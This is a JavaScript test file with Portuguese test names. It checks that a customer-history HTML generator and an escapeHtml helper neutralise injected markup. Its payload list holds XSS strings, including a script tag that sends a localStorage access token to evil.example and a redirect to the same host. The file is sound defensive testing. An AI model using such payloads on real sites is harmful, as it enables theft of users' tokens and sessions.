import test from 'node:test'
import assert from 'node:assert/strict'
import { escapeHtml } from './escapeHtml.ts'
import { gerarHistoricoClienteHtml } from './customerHistoryHtml.ts'

const PAYLOADS = [
  '<img src=x onerror=alert(document.domain)>',
  '<script>fetch("//evil.example/?t="+localStorage.accessToken)</script>',
  '"><svg onload=alert(1)>',
  "'; document.location='//evil.example'; '",
  '`${alert(1)}`',
]

const historico = (p) => ({
  cliente: { nome: p, telefone: p, localizacao: p, observacoes: p, cpfCnpj: null },
  vendas: [{
    data: '2026-11-11', modeloCaixa: p, qtdeCaixas6424: 10, caixasPagasVale: 4, caixasDevendoVale: 6,
    pagamentoVerduras: p, valorPago: 0, mercadorias: [{ nome: p, qtde: 2, valor: 10 }],
  }],
})

test('escapeHtml neutraliza os caracteres perigosos', () => {
  assert.equal(escapeHtml('<a href="x" onclick=\'y\'>&`'), '&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;&#96;')
  assert.equal(escapeHtml(null), '')
  assert.equal(escapeHtml(undefined), '')
  assert.equal(escapeHtml(42), '42')
})

for (const payload of PAYLOADS) {
  test(`histórico do cliente não deixa executar: ${payload.slice(0, 30)}`, () => {
    const html = gerarHistoricoClienteHtml(historico(payload))
    // no raw tag or attribute breakout from user-controlled text survives
    assert.ok(!/<img\b/i.test(html), 'tag <img> crua')
    assert.ok(!/<script\b/i.test(html), 'tag <script> crua')
    assert.ok(!/<svg\b/i.test(html), 'tag <svg> crua')
    // the markup has exactly as many tags as with harmless text: nothing new was injected
    const tags = (t) => (t.match(/</g) || []).length
    assert.equal(tags(html), tags(gerarHistoricoClienteHtml(historico('texto comum'))), 'tags a mais')
    // and the text is still there, as text
    assert.ok(html.includes(escapeHtml(payload)), 'o texto deve aparecer escapado')
  })
}

test('o histórico continua mostrando os dados normais', () => {
  const html = gerarHistoricoClienteHtml(historico('Mercearia Boa Safra'))
  assert.ok(html.includes('Mercearia Boa Safra'))
  assert.ok(html.includes('R$ 20.00'))
})
